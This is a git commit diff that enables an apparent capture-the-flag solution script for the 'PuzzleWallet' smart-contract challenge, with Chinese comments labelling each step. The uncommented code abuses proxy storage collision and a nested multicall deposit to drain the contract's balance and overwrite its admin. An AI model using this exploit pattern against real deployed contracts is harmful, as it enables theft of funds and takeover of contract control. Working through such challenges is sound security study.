49440fd04d44bf7e33b146b5d730316ac5f5fa9b
chobyn <chobynleo@gmail.com>
2022-09-19 21:09:29 +0800

    fix PuzzleWallet

--- script/test/test_PuzzleWallet.js
+++ script/test/test_PuzzleWallet.js
@@ -19,28 +19,28 @@ async function main() {
     let proxyContract = await new ethers.Contract(PuzzleProxy.address, Abi, owner);
 
     // 1.先修改pendingAdmin，在PuzzleWallet相当于onwer
-    // await proxyContract.proposeNewAdmin(owner.address)
+    await proxyContract.proposeNewAdmin(owner.address)
 
     // 2.把自己添加进白名单
-    // await proxyContract.addToWhitelist(owner.address)
+    await proxyContract.addToWhitelist(owner.address)
 
     // 3.通过muticall编码，实现给一次存款但是存两次
-    // let iface = new ethers.utils.Interface([
-    //     "function multicall(bytes[] calldata data) payable",
-    //     "function deposit() payable",
-    // ])
-    // console.log(iface.encodeFunctionData("deposit")) //0xd0e30db0
-    // let depositSelector = iface.encodeFunctionData("deposit")
-    // let multicallSelector = iface.encodeFunctionData("multicall", [[depositSelector]])
-    // console.log(await proxyContract.multicall([depositSelector, multicallSelector], {value: 1000000000000000}))
-    // console.log(await proxyContract.balances(owner.address))
+    let iface = new ethers.utils.Interface([
+        "function multicall(bytes[] calldata data) payable",
+        "function deposit() payable",
+    ])
+    console.log(iface.encodeFunctionData("deposit")) //0xd0e30db0
+    let depositSelector = iface.encodeFunctionData("deposit")
+    let multicallSelector = iface.encodeFunctionData("multicall", [[depositSelector]])
+    console.log(await proxyContract.multicall([depositSelector, multicallSelector], {value: 1000000000000000}))
+    console.log(await proxyContract.balances(owner.address))
 
     // 4.调用execute使得代理balance为0
-    // await proxyContract.execute(owner.address, "2000000000000000", 0x0)
-    // console.log(await provider.getBalance(PuzzleProxy.address))
+    await proxyContract.execute(owner.address, "2000000000000000", 0x0)
+    console.log(await provider.getBalance(PuzzleProxy.address))
 
     // 5.通过setMaxBalance去设置maxBalance从而改变admin
-    // await proxyContract.setMaxBalance(chobyn.addressBytes)
+    await proxyContract.setMaxBalance(chobyn.addressBytes)
 
     console.log(await provider.getStorageAt(proxyContract.address, 1))
 }
